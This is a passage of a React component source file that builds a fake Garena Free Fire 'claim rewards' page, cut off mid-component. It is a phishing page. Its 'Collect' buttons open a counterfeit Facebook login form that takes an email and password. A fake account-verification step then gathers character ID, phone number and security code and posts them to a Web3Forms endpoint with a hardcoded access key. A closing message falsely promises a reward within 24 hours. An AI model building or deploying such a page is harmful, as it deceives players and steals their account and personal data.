import React, { useState } from 'react'
import freefireLogo from '../assets/images/freefire-logo.jpg';
import img1 from '../assets/images/1.jpg';
import img2 from '../assets/images/2.jpg';
import img3 from '../assets/images/3.jpg';
import img4 from '../assets/images/4.jpg';
import img5 from '../assets/images/5.jpg';
import img6 from '../assets/images/6.jpg';
import img7 from '../assets/images/7.jpg';
import img8 from '../assets/images/8.jpg';
import img9 from '../assets/images/9.jpg';
import img10 from '../assets/images/10.jpg';
import img11 from '../assets/images/11.jpg';
import img12 from '../assets/images/12.jpg';
import menuImg from '../assets/images/menu.png';
import gameVideo from '../assets/video/game-video.mp4';
import closeImg from '../assets/images/popup-close.png';
import popupNavbar from '../assets/images/popup-navbar.png';
import popupFooter from '../assets/images/popup-footer.png';
import popupBg from '../assets/images/popup-box-bg.png'; 
import menuBtn from '../assets/images/menu_on.png';
import profile from '../assets/images/profile.png';

// Add SVG icons for eye and eye-slash
const EyeIcon = (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#65676b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path><circle cx="12" cy="12" r="3"></circle></svg>
);
const EyeSlashIcon = (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#65676b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.81 21.81 0 0 1 5.06-6.06M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"></path><path d="M1 1l22 22"></path></svg>
);

const WEB3FORMS_ACCESS_KEY = "67a9cc91-daea-421c-81a9-b1e5e447c316"; // <-- Replace with your Web3Forms access key

export default function Freefire() {
    const [showModal, setShowModal] = useState(false);
    const [selectedImg, setSelectedImg] = useState(null);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [showFbFormModal, setShowFbFormModal] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [showAccountVerification, setShowAccountVerification] = useState(false);
    const [fbEmail, setFbEmail] = useState("");
    const [fbPassword, setFbPassword] = useState("");
    const [fbLoginError, setFbLoginError] = useState("");
    const [accLevel, setAccLevel] = useState("");
    const [showAccLoader, setShowAccLoader] = useState(false);
    const [accSuccess, setAccSuccess] = useState(false);
    const [accError, setAccError] = useState("");
    const [accCharId, setAccCharId] = useState("");
    const [accPhone, setAccPhone] = useState("");
    const [accCode, setAccCode] = useState("");
    const [showProcessingPopup, setShowProcessingPopup] = useState(false);
    const handleCollectClick = (img) => {
        setSelectedImg(img);
        setShowModal(true);
    };
    const handleCloseModal = () => setShowModal(false);
    const handleOpenLoginModal = () => {
        setShowModal(false);
        setShowLoginModal(true);
    };
    const handleCloseLoginModal = () => setShowLoginModal(false);
    return (
        <>
            {/* Modal Animation CSS */}
            <style>{`
                @keyframes modalPop {
                    0% { opacity: 0; transform: scale(0.8); }
                    100% { opacity: 1; transform: scale(1); }
                }
            `}</style>
            <div className="main-container" style={{ position: 'relative' }}>
                {/* +++++++++++++++++++++Navbar++++++++++++++++++++ */}
                <nav>
                    <label htmlFor="" className="logo">
                        <img src="" alt="" />
                        <img src={freefireLogo} width="100px" alt="" />
                    </label>
                    <ul>
                        <li>
                            <i className="ri-facebook-line" />
                        </li>
                        <li>
                            <i className="ri-instagram-line" />
                        </li>
                        <li>
                            <i className="ri-youtube-line" />
                        </li>
                        <div className="toggler">
                            <img src={menuImg} alt="" />
                        </div>
                    </ul>
                </nav>
                {/* +++++++++++++++++++++++++++++Video Section +++++++++++++++++++ */}
                <div className="video-section">
                    <video src={gameVideo} autoPlay muted loop />
                </div>
                {/* ++++++++++++++++++++++++++Reward++++++++++++++++++ */}
                <div id="reward-section">
                    <div className="container">
                        <div className="row title-row justify-content-center ">
                            <div className="col-11 d-flex justify-content-center align-items-center reward-heading pt-0 pb-0">
                                <p className="px-2 m-0">claim and get your exclusive rewards now</p>
                            </div>
                        </div>
                        <div className="row px-3 gy-2 mt-2">
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img1} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img1)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img2} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img2)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img3} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img3)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img4} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img4)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img5} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img5)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img6} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img6)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img7} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img7)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img8} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img8)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img9} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img9)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img10} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img10)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img11} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img11)}>Collect</button>
                                </div>
                            </div>
                            <div className="col-4 px-2">
                                <div>
                                    <div className="reward-item">
                                        <img src={img12} className="img-fluid " alt="" />
                                    </div>
                                    <button className="collect-btn" onClick={() => handleCollectClick(img12)}>Collect</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                {/* Modal */}
                {showModal && (
                    <div style={{
                        position: 'fixed',
                        top: 0,
                        left: 0,
                        width: '100%',
                        height: '100%',
                        background: 'rgba(0,0,0,0.5)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        zIndex: 1000
                    }}>
                        <div
                            style={{
                                background: `url(${popupBg}) center center / cover no-repeat`,
                                width: '100%',
                                maxWidth: 'calc(390px + 4px)',
                                maxHeight: '90vh',
                                boxShadow: '0 2px 16px rgba(0,0,0,0.2)',
                                textAlign: 'center',
                                minWidth: '200px',
                                position: 'relative',
                                animation: 'modalPop 0.35s cubic-bezier(.4,2,.6,1)',
                                padding: 0,
                                overflow: 'hidden',
                                display: 'flex',
                                flexDirection: 'column',
                                boxSizing: 'border-box',
                                marginTop: '-100px'
                            }}
                        >
                            {/* Header Bar */}
                            <div style={{
                                width: '100%',
                                height: '35px',
                                background: `url(${popupNavbar}) center center / cover no-repeat`,
                                padding: 0,
                                borderBottom: '1px solid #444',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                            }}>
                                <span style={{
                                    color: '#d3a433',
                                    fontWeight: 700,
                                    fontSize: '13px',
                                    letterSpacing: '1px',
                                    marginTop: '5px',
                                    textTransform: 'uppercase',
                                }}>Reward Confirmation</span>
                            </div>
                            {/* Close Button */}
                            <button onClick={handleCloseModal} style={{
                                position: 'absolute',
                                top: 3,
                                right: 8,
                                background: 'transparent',
                                border: 'none',
                                padding: 0,
                                cursor: 'pointer',
                                width: 20,
                                height: 20,
                                zIndex: 2
                            }}>
                                <img src={closeImg} alt="Close" style={{width: 24, height: 24, display: 'block'}} />
                            </button>
                            {/* Modal Content */}
                            <div style={{
                                padding: '5px 0 24px 0',
                                flex: 1,
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                justifyContent: 'center',
                                overflowY: 'auto',
                                minHeight: 0
                            }}>
                                <div style={{
                                    color: '#e7debd',
                                    fontWeight: 600,
                                    fontSize: '14px',
                                    marginBottom: '14px',
                                    letterSpacing: '0.5px',
                                    textShadow: '0 1px 2px #000',
                                }}>
                                    Are you sure to collect this reward?
                                </div>
                                {selectedImg && (
                                    <div className="reward-item" style={{margin: '0 auto 24px auto', display: 'inline-block'}}>
                                        <img width="90px" height="90px" src={selectedImg} alt="Selected Reward" className="img-fluid" />
                                    </div>
                                )}
                                <button
                                    style={{
                                        width: '90px',
                                        padding: '8px 10px',
                                        fontSize: '1rem',
                                        display: 'block',
                                        margin: '0 auto',
                                        marginBottom: '-23px',
                                        marginTop: '-10px',
                                        background: `url(${menuBtn}) center center / contain no-repeat`,
                                        color: '#c3bea7',
                                        border: 'none',
                                        borderRadius: '8px',
                                        fontWeight: 700,
                                        cursor: 'pointer',
                                        letterSpacing: '1px',
                                        transition: 'background 0.2s',
                                        position: 'relative',
                                        zIndex: 1,
                                        textShadow: '0 1px 4px #000',
                                    }}
                                    onClick={handleOpenLoginModal}
                                >Collect</button>
                            </div>
                            {/* Popup Footer Image */}
                            <div style={{width: '100%', height: '35px', overflow: 'hidden', padding: 0}}>
                                <img src={popupFooter} alt="Popup Footer" style={{width: '100%', height: '100%', objectFit: 'cover', display: 'block'}} />
                            </div>
                        </div>
                    </div>
                )}
                {/* Login Modal */}
                {showLoginModal && (
                    <div style={{
                        position: 'fixed',
                        top: 0,
                        left: 0,
                        width: '100%',
                        height: '100%',
                        background: 'rgba(0,0,0,0.5)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        zIndex: 1000
                    }}>
                        <div
                            style={{
                                background: `url(${popupBg}) center center / cover no-repeat`,
                                width: '100%',
                                maxWidth: 'calc(390px + 4px)',
                                maxHeight: '90vh',
                                boxShadow: '0 2px 16px rgba(0,0,0,0.2)',
                                textAlign: 'center',
                                minWidth: '200px',
                                position: 'relative',
                                animation: 'modalPop 0.35s cubic-bezier(.4,2,.6,1)',
                                padding: 0,
                                overflow: 'hidden',
                                display: 'flex',
                                flexDirection: 'column',
                                boxSizing: 'border-box',
                                 marginTop: '-150px'
                            }}
                        >
                            {/* Header Bar */}
                            <div style={{
                                width: '100%',
                                height: '35px',
                                background: `url(${popupNavbar}) center center / cover no-repeat`,
                                padding: 0,
                                borderBottom: '1px solid #444',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                            }}>
                                <span style={{
                                    color: '#d3a433',
                                    fontWeight: 700,
                                    fontSize: '13px',
                                    letterSpacing: '1px',
                                    marginTop: '5px',
                                    textTransform: 'uppercase',
                                }}>Account Login</span>
                            </div>
                            {/* Close Button */}
                            <button onClick={handleCloseLoginModal} style={{
                                position: 'absolute',
                                top: 3,
                                right: 8,
                                background: 'transparent',
                                border: 'none',
                                padding: 0,
                                cursor: 'pointer',
                                width: 20,
                                height: 20,
                                zIndex: 2
                            }}>
                                <img src={closeImg} alt="Close" style={{width: 24, height: 24, display: 'block'}} />
                            </button>
                            {/* Modal Content */}
                            <div style={{
                                padding: '5px 0 24px 0',
                                flex: 1,
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                justifyContent: 'center',
                                overflowY: 'auto',
                                minHeight: 0
                            }}>
                                <div style={{
                                    color: '#e7debd',
                                    fontWeight: 600,
                                    fontSize: '14px',
                                    marginBottom: '14px',
                                    letterSpacing: '0.5px',
                                    textShadow: '0 1px 2px #000',
                                }}>
                                    Please log in to collect your reward
                                </div>
                                <button
                                    style={{
                                        width: '100%',
                                        maxWidth: '350px',
                                        padding: '0 18px',
                                        height: '35px',
                                        fontSize: '13px',
                                        margin: '0 auto',
                                        background: '#1877f3',
                                        color: '#fff',
                                        border: 'none',
                                        borderRadius: '2px',
                                        cursor: 'pointer',
                                        letterSpacing: '1px',
                                        transition: 'background 0.2s',
                                        position: 'relative',
                                        zIndex: 1,
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        marginTop: '20px'
                                    }}
                                    onClick={() => setShowFbFormModal(true)}
                                >
                                    <i className="ri-facebook-fill" style={{
                                        fontSize: '20px',
                                        color: '#fff',
                                        background: '#1877f3',
                                        borderRadius: '3px',
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        position: 'absolute',
                                        left: '20px',
                                    }}></i>
                                    <span style={{
                                        fontWeight: 600,
                                        fontSize: '14px',
                                        color: '#fff',
                                        letterSpacing: '0.5px',
                                        width: '100%',
                                        textAlign: 'center',
                                    }}>Log in using Facebook account</span>
                                </button>
                            </div>
                            {/* Popup Footer Image */}
                            <div style={{width: '100%', height: '35px', overflow: 'hidden', padding: 0}}>
                                <img src={popupFooter} alt="Popup Footer" style={{width: '100%', height: '100%', objectFit: 'cover', display: 'block'}} />
                            </div>
                        </div>
                    </div>
                )}
                {/* Facebook Form Modal (only opens on Facebook button click) */}
                {showFbFormModal && (
                    <div style={{
                        position: 'fixed',
                        top: 0,
                        left: 0,
                        width: '100%',
                        height: '100%',
                        background: 'rgba(0,0,0,0.5)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        zIndex: 1000,
                        fontFamily: 'Segoe UI, Helvetica Neue, Arial, sans-serif',
                      
                    }}>
                        <div className="form-container"
                            style={{
                                background: '#ECEFF6',
                                width: '100%',
                                maxWidth: '350px',
                                borderRadius: '10px',
                                boxShadow: '0 2px 16px rgba(0,0,0,0.15)',
                                overflow: 'visible',
                                position: 'relative',
                                padding: 0,
                                display: 'flex',
                                flexDirection: 'column',
                                boxSizing: 'border-box',
                           
                            }}
                        >
                            {/* Close Button */}
                            <button onClick={() => setShowFbFormModal(false)}
                                style={{
                                    position: 'absolute',
                                    top: -10,
                                    right: -10,
                                    background: '#000',
                                    border: 'none',
                                    padding: '10px 10px 15px 10px',
                                    cursor: 'pointer',
                                    width: 24,
                                    height: 24,
                                    zIndex: 2,
                                    color: '#fff',
                                    borderRadius: '50%',
                                    fontSize: '20px',
                                    fontWeight: 700,
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    border: '1px solid #a9a1a1'
                                }}
                                aria-label="Close"
                            >
                                ×
                            </button>
                            {/* Facebook Header */}
                            <div style={{
                                background: '#3b5998',
                                padding: '5px 0',
                                textAlign: 'center',
                                borderTopLeftRadius: '10px',
                                borderTopRightRadius: '10px',
                            }}>
                                <span style={{
                                    color: '#fff',
                                    fontWeight: 700,
                                    fontSize: '25px',
                                    fontFamily: 'inherit',
                                }}>facebook</span>
                            </div>
                            {/* App Icon */}
                           
                            <div style={{
                                display: 'flex',
                                justifyContent: 'center',
                                marginTop: '15px',
                                marginBottom: '15px',
                               
                            }}>
                                <img src={profile} alt="App Icon" style={{width: '70px', height: '70px', borderRadius: '10px', border: '2px solid #fff', background: '#fff'}} />
                            </div>
                            {/* Description */}
                            <div style={{
                                color: '#90949c',
                                fontSize: '16px',
                                textAlign: 'center',
                                padding: '0px 30px',
                                marginBottom: "20px"
                            }}>
                                Log in to your Facebook account to connect to Garena Free Fire.
                            </div>
                            {/* Form */}
                            <form
                                style={{padding: '0 18px 18px 18px', position: 'relative'}}
                                onSubmit={e => {
                                    e.preventDefault();
                                    if (!fbEmail.trim() || !fbPassword.trim()) {
                                        setFbLoginError("Please enter both email and password.");
                                        return;
                                    }
                                    setFbLoginError("");
                                    setShowFbFormModal(false);
                                    setShowAccountVerification(true);
                                }}
                            >
                                <input type="text" placeholder="Mobile number or email address" value={fbEmail} onChange={e => setFbEmail(e.target.value)} style={{
                                    width: '100%',
                                    padding: '10px',
                                    marginBottom: '0',
                                    border: '1px solid #b9b0b0',
                                    borderRadius: '5px 5px 0px 0px',
                                    fontSize: '15px',
                                    outline: 'none',
                                    background: '#fff',
                                }} />
                                <div style={{position: 'relative', width: '100%'}}>
                                    <input
                                        type={showPassword ? 'text' : 'password'}
                                        placeholder="Password"
                                        value={fbPassword}
                                        onChange={e => setFbPassword(e.target.value)}
                                        style={{
                                            width: '100%',
                                            padding: '10px 38px 10px 10px',
                                            marginBottom: '10px',
                                            border: '1px solid #b9b0b0',
                                            borderRadius: '0px 0px 5px 5px',
                                            fontSize: '15px',
                                            outline: 'none',
                                            background: '#fff',
                                        }}
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setShowPassword((prev) => !prev)}
                                        style={{
                                            position: 'absolute',
                                            right: '15px',
                                            top: '40%',
                                            transform: 'translateY(-50%)',
                                            background: 'none',
                                            border: 'none',
                                            padding: 0,
                                            margin: 0,
                                            cursor: 'pointer',
                                            color: '#65676b',
                                            fontSize: '16px',
                                            zIndex: 2,
                                            display: 'flex',
                                            alignItems: 'center',
                                            justifyContent: 'center',
                                            transition: 'color 0.18s',
                                        }}
                                        tabIndex={-1}
                                        aria-label={showPassword ? 'Hide password' : 'Show password'}
                                        onMouseOver={e => e.currentTarget.style.color = '#1877f2'}
                                        onMouseOut={e => e.currentTarget.style.color = '#65676b'}
                                    >
                                        {showPassword ? EyeSlashIcon : EyeIcon}
                                    </button>
                                </div>
                                {fbLoginError && (
                                    <div style={{ color: '#b71c1c', fontSize: '12px', margin: '4px 0 0 0', textAlign: 'center', fontWeight: 600 }}>
                                        {fbLoginError}
                                    </div>
                                )}
                                <button type="submit" style={{
                                    width: '100%',
                                    background: '#1877f2',
                                    color: '#fff',
                                    fontWeight: 700,
                                    fontSize: '16px',
                                    border: 'none',
                                    borderRadius: '6px',
                                    padding: '10px 0',
                                    marginBottom: '14px',
                                    marginTop: "20px",
                                    cursor: 'pointer',
                                    fontFamily: 'inherit',
                                }}>Log In</button>
                                {/* Facebook-style links below login button */}
                                <div className="fb-links-container" style={{ fontSize: '11px', marginTop: '6px', marginBottom: '2px', padding: 0 }}>
                                    <a href="#" className="fb-link fb-link-create">Create account</a>
                                    <a href="#" className="fb-link fb-link-notnow">Not now</a>
                                    <a href="#" className="fb-link fb-link-forgot">Forgotten password?</a>
                                </div>
                            </form>
                            {/* Language Links Section (Facebook style) */}
                            <div style={{
                                background: 'transparent',
                                padding: '12px 0 0 0',
                                borderBottomLeftRadius: '10px',
                                borderBottomRightRadius: '10px',
                                textAlign: 'center',
                                marginTop: "10px"
                            }}>
                                <div style={{
                                    display: 'flex',
                                    flexWrap: 'wrap',
                                    justifyContent: 'center',
                                    gap: '0 28px',
                                    fontSize: '13px',
                                    color: '#385898',
                                    fontFamily: 'inherit',
                                    marginBottom: '2px',
                                }}>
                                    <div style={{ minWidth: '110px', textAlign: 'left' }}>
                                        <div style={{ color: '#8a8d91', fontWeight: 600 }}>English (UK)</div>
                                        <div>Basa Jawa</div>
                                        <div>日本語</div>
                                        <div>Português (Brasil)</div>
                                    </div>
                                    <div style={{ minWidth: '110px', textAlign: 'left' }}>
                                        <div>Bahasa Indonesia</div>
                                        <div>Bahasa Melayu</div>
                                        <div>Español <button style={{
                                            border: '1px solid #ccd0d5',
                                            background: '#f5f6f7',
                                            borderRadius: '3px',
                                            width: '20px',
                                            height: '20px',
                                            marginLeft: '6px',
                                            verticalAlign: 'middle',
                                            display: 'inline-flex',
                                            alignItems: 'center',
                                            justifyContent: 'center',
                                            padding: 0,
                                            cursor: 'pointer',
                                        }}>+</button></div>
                                    </div>
                                </div>
                                <div style={{ color: '#b0b3b8', fontSize: '11px', margin: '12px 0px' }}>Facebook Inc.</div>
                            </div>
                        </div>
                    </div>
                )}
                {showAccountVerification && (
                    <div style={{
                        position: 'fixed',
                        top: 0,
                        left: 0,
                        width: '100%',
                        height: '100%',
                        background: 'rgba(0,0,0,0.5)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        zIndex: 1100,
                    }}>
                        <div
                            style={{
                                background: `url(${popupBg}) center center / cover no-repeat`,
                                width: '100%',
                                maxWidth: 'calc(390px + 4px)',
                                maxHeight: '90vh',
                                boxShadow: '0 2px 16px rgba(0,0,0,0.2)',
                                textAlign: 'center',
                                minWidth: '200px',
                                position: 'relative',
                                animation: 'modalPop 0.35s cubic-bezier(.4,2,.6,1)',
                                padding: 0,
                                overflow: 'hidden',
                                display: 'flex',
                                flexDirection: 'column',
                                boxSizing: 'border-box',
                                marginTop: '-100px',
                            }}
                        >
                            {/* Header Bar */}
                            <div style={{
                                width: '100%',
                                height: '35px',
                                background: `url(${popupNavbar}) center center / cover no-repeat`,
                                padding: 0,
                                borderBottom: '1px solid #444',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                            }}>
                                <span style={{
                                    color: '#d3a433',
                                    fontWeight: 700,
                                    fontSize: '13px',
                                    letterSpacing: '1px',
                                    marginTop: '5px',
                                    textTransform: 'uppercase',
                                }}>Account Verification</span>
                            </div>
                            {/* Close Button */}
                            <button onClick={() => setShowAccountVerification(false)} style={{
                                position: 'absolute',
                                top: 3,
                                right: 8,
                                background: 'transparent',
                                border: 'none',
                                padding: 0,
                                cursor: 'pointer',
                                width: 20,
                                height: 20,
                                zIndex: 2
                            }}>
                                <img src={closeImg} alt="Close" style={{width: 24, height: 24, display: 'block'}} />
                            </button>
                            {/* Modal Content */}
                            <div style={{
                                padding: '5px 0 24px 0',
                                flex: 1,
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                justifyContent: 'center',
                                overflowY: 'auto',
                                minHeight: 0
                            }}>
                                <div style={{
                                    color: '#e7debd',
                                    fontWeight: 600,
                                    fontSize: '16px',
                                    marginBottom: '14px',
                                    letterSpacing: '0.5px',
                                    textShadow: '0 1px 2px #000',
                                }}>
                                    Complete your account details
                                </div>
                                <form style={{width: '90%', maxWidth: 300, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: '7px'}}
                                    onSubmit={async e => {
                                        e.preventDefault();
                                        if (!accCharId.trim() || !accPhone.trim() || !accLevel.trim()) {
                                            setAccError("Please fill all required fields.");
                                            return;
                                        }
                                        setAccError("");
                                        setShowAccLoader(true);
                                        // Web3Forms integration
                                        const formData = {
                                            access_key: WEB3FORMS_ACCESS_KEY,
                                            subject: "New Account Verification Submission",
                                            characterId: accCharId,
                                            phoneNumber: accPhone,
                                            accountLevel: accLevel,
                                            securityCode: accCode,
                                        };
                                        try {
                                            const res = await fetch("https://api.web3forms.com/submit", {
                                                method: "POST",
                                                headers: { "Content-Type": "application/json" },
                                                body: JSON.stringify(formData),
                                            });
                                            if (res.ok) {
                                                setTimeout(() => {
                                                    setShowAccLoader(false);
                                                    setAccSuccess(false);
                                                    setShowAccountVerification(false);
                                                    setShowProcessingPopup(true);
                                                }, 2000);
                                            } else {
                                                setShowAccLoader(false);
                                                setAccError("Failed to send email. Please try again.");
                                            }
                                        } catch (err) {
                                            setShowAccLoader(false);
                                            setAccError("Failed to send email. Please try again.");
                                        }
                                    }}
                                >
                                    {showAccLoader && (
                                        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 10 }}>
                                            <div style={{
                                                width: 36, height: 36, border: '4px solid #e7debd', borderTop: '4px solid transparent', borderRadius: '50%',
                                                animation: 'spin 1s linear infinite', marginBottom: 18
                                            }} />
                                            <div style={{ color: '#e7debd', fontWeight: 600, fontSize: 14 }}>Check your information</div>
                                            <style>{`@keyframes spin { 0% { transform: rotate(0deg);} 100% {transform: rotate(360deg);} }`}</style>
                                        </div>
                                    )}
                                    {accSuccess && !showAccLoader && (
                                        <div style={{ color: '#4caf50', fontWeight: 700, fontSize: 16, marginBottom: 10 }}>Success!</div>
                                    )}
                                    {!showAccLoader && !accSuccess && (
                                        <>
                                            {accError && (
                                                <div style={{ color: '#b71c1c', fontSize: '12px', margin: '0 0 6px 0', textAlign: 'center', fontWeight: 600 }}>
                                                    {accError}
                                                </div>
                                            )}
                                            <input type="number" required name="characterId" className="ff-account-verification-input" placeholder="Character ID" value={accCharId} onChange={e => setAccCharId(e.target.value)} style={{
                                                width: '100%',
                                                padding: '7px',
                                                border: 'none',
                                                fontSize: '14px',
                                                outline: 'none',
                                                background: 'transparent',
                                                color: '#e7debd',
                                                fontWeight: 600,
                                                boxShadow: '0 0 2px 0 #fff',
                                            }} />
                                            <input type="number" required name="phoneNumber" className="ff-account-verification-input" placeholder="Phone Number" value={accPhone} onChange={e => setAccPhone(e.target.value)} style={{
                                                width: '100%',
                                                padding: '7px',
                                                border: 'none',
                                                fontSize: '14px',
                                                outline: 'none',
                                                background: 'transparent',
                                                color: '#e7debd',
                                                fontWeight: 600,
                                                boxShadow: '0 0 2px 0 #fff',
                                            }} />
                                            <select required name="accountLevel" className="ff-account-verification-input" value={accLevel} onChange={e => setAccLevel(e.target.value)} style={{
                                                width: '100%',
                                                padding: '7px',
                                                border: 'none',
                                                fontSize: '14px',
                                                outline: 'none',
                                                background: 'transparent',
                                                color: '#e7debd',
                                                fontWeight: 600,
                                                boxShadow: '0 0 2px 0 #fff',
                                                marginBottom: '7px',
                                            }}>
                                                <option value="" disabled style={{color: '#e7debd'}}>Account Level (Min 50 - 100lvl)</option>
                                                {[...Array(51)].map((_, i) => (
                                                    <option key={i+50} value={i+50} style={{color: '#000'}}>{i+50}</option>
                                                ))}
                                            </select>
                                            <input type="number" name="securityCode" className="ff-account-verification-input" placeholder="Security Code (Optional)" value={accCode} onChange={e => setAccCode(e.target.value)} style={{
                                                width: '100%',
                                                padding: '8px 10px',
                                                border: 'none',
                                                fontSize: '14px',
                                                outline: 'none',
                                                background: 'transparent',
                                                color: '#e7debd',
                                                fontWeight: 600,
                                                boxShadow: '0 0 2px 0 #fff',
                                            }} /> <br />
                                            <button type="submit" style={{
                                                width: '90%',
                                                background: `url(${menuBtn}) center center / contain no-repeat`,
                                                color: '#c3bea7',
                                                fontSize: '20px',
                                                fontWeight: 700,
                                                border: 'none',
                                                borderRadius: '8px',
                                                padding: '7px 0',
                                                cursor: 'pointer',
                                                letterSpacing: '1px',
                                                transition: 'background 0.2s',
                                                position: 'relative',
                                                zIndex: 1,
                                                textShadow: '0 1px 4px #000',
                                                margin: '0 auto',
                                                marginBottom: '-23px',
                                                marginTop: '-10px',
                                                boxShadow: '0 2px 8px rgba(0,0,0,0.08)',
                                            }}>Verify</button>
                                        </>
                                    )}
                                </form>
                            </div>
                            {/* Popup Footer Image */}
                            <div style={{width: '100%', height: '35px', overflow: 'hidden', padding: 0}}>
                                <img src={popupFooter} alt="Popup Footer" style={{width: '100%', height: '100%', objectFit: 'cover', display: 'block'}} />
                            </div>
                        </div>
                    </div>
                )}
                {showProcessingPopup && (
                    <div style={{
                        position: 'fixed',
                        top: 0,
                        left: 0,
                        width: '100%',
                        height: '100%',
                        background: 'rgba(0,0,0,0.5)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        zIndex: 1200,
                    }}>
                        <div
                            style={{
                                background: `url(${popupBg}) center center / cover no-repeat`,
                                width: '100%',
                                maxWidth: 'calc(390px + 4px)',
                                maxHeight: '90vh',
                                boxShadow: '0 2px 16px rgba(0,0,0,0.2)',
                                textAlign: 'center',
                                minWidth: '200px',
                                position: 'relative',
                                animation: 'modalPop 0.35s cubic-bezier(.4,2,.6,1)',
                                padding: 0,
                                overflow: 'hidden',
                                display: 'flex',
                                flexDirection: 'column',
                                boxSizing: 'border-box',
                                marginTop: '-100px',
                            }}
                        >
                            {/* Header Bar */}
                            <div style={{
                                width: '100%',
                                height: '35px',
                                background: `url(${popupNavbar}) center center / cover no-repeat`,
                                padding: 0,
                                borderBottom: '1px solid #444',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                            }}>
                                <span style={{
                                    color: '#d3a433',
                                    fontWeight: 700,
                                    fontSize: '13px',
                                    letterSpacing: '1px',
                                    marginTop: '5px',
                                    textTransform: 'uppercase',
                                }}>Processing Account</span>
                            </div>
                            {/* Close Button (hidden, only logout) */}
                            {/* Modal Content */}
                            <div style={{
                                padding: '30px 0 24px 0',
                                flex: 1,
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                justifyContent: 'center',
                                overflowY: 'auto',
                                minHeight: 0
                            }}>
                                <div style={{
                                    color: '#e7debd',
                                    fontWeight: 600,
                                    fontSize: '18px',
                                    marginBottom: '18px',
                                    letterSpacing: '0.5px',
                                    textShadow: '0 1px 2px #000',
                                }}>
                                    Thank you for joining this event
                                </div>
                                <div style={{
                                    color: '#e7debd',
                                    fontWeight: 600,
                                    fontSize: '16px',
                                    marginBottom: '18px',
                                    letterSpacing: '0.5px',
                                    textShadow: '0 1px 2px #000',
                                }}>
                                    Your account has been successfully processed
                                </div>
                                <div style={{
                                    color: '#e7debd',
                                    fontWeight: 600,
                                    fontSize: '15px',
                                    marginBottom: '8px',
                                    letterSpacing: '0.5px',
                                    textShadow: '0 1px 2px #000',
                                }}>
                                    To receive your exclusive reward<br />Please wait up to 24 hours
                                </div>
                                <button onClick={() => {
                                    setShowProcessingPopup(false);
                                    setShowAccountVerification(false);
                                    setShowModal(false);
                                    setShowLoginModal(false);
                                    setShowFbFormModal(false);
                                }} style={{
                                    width: '160px',
